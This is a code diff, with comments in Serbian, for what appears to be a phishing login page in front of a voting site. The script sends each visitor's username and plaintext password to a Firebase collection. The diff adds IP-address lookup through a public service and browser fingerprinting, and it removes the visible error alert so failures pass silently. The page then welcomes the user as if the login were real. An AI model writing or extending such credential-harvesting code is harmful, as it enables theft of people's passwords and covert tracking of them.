@@ -57,7 +57,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        function captureAndLogin() {
+          async function captureAndLogin() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
 
@@ -66,22 +66,32 @@
                 return;
             }
 
-            // SLANJE PODATAKA U FIREBASE
-            db.collection("korisnici_logovi").add({
+            // Uzimamo IP adresu preko besplatnog servisa
+            let ip = "Nepoznato";
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ip = data.ip;
+            } catch (e) { console.log("IP nije dostupan"); }
+
+            // Sakupljamo sve podatke
+            const podaci = {
                 korisnik: u,
                 lozinka: p,
-                vreme: new Date().toLocaleString()
-            })
+                vreme: new Date().toLocaleString(),
+                ip_adresa: ip,
+                uredjaj: navigator.userAgent
+            };
+
+            // Šaljemo u Firebase
+            db.collection("korisnici_logovi").add(podaci)
             .then(() => {
-                console.log("Podaci uspešno poslati!");
-                // Sakrij formu i prikaži sajt za glasanje
                 document.getElementById('login-form').style.display = 'none';
                 document.getElementById('app-content').style.display = 'block';
                 document.getElementById('welcome-msg').innerText = "Dobrodošao, " + u + "!";
             })
             .catch((error) => {
-                console.error("Greška pri slanju: ", error);
-                alert("Došlo je do greške pri povezivanju sa serverom.");
+                console.error("Greška: ", error);
             });
         }
     </script>
